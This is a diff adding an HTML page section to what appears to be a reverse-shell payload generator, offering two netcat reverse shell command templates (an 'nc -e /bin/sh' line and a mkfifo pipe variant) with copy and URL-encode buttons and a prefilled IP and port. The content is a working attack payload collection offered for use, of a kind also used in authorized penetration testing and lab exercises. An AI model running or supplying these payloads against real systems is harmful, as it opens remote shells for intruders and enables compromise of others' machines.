@@ -1,0 +1,39 @@
+<section class="page active">
+  <h1>Netcat reverse shell</h1>
+  <p class="intro">
+    Netcat reverse shell payloads.
+  </p>
+
+  <div class="input-row">
+    <input class="rs-input rs-ip" value="192.168.45.166" aria-label="IP address">
+    <input class="rs-input rs-port" value="4444" aria-label="Port">
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Netcat</h2>
+    <span></span>
+  </div>
+
+  <div class="payload-block">
+    <div class="payload-box">
+      <code class="copy-text rs-payload" data-template="nc -e /bin/sh {IP} {PORT}"></code>
+      <button class="copy-icon" type="button" title="Copy">Copy</button>
+    </div>
+    <div class="action-row">
+      <button class="copy-main" type="button">Copy the reverse shell</button>
+      <button class="secondary-button url-encode-button" type="button">URL encoded</button>
+    </div>
+  </div>
+
+  <div class="payload-block">
+    <div class="payload-box">
+      <code class="copy-text rs-payload" data-template="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc {IP} {PORT} &gt;/tmp/f"></code>
+      <button class="copy-icon" type="button" title="Copy">Copy</button>
+    </div>
+    <div class="action-row">
+      <button class="copy-main" type="button">Copy the reverse shell</button>
+      <button class="secondary-button url-encode-button" type="button">URL encoded</button>
+    </div>
+  </div>
+</section>
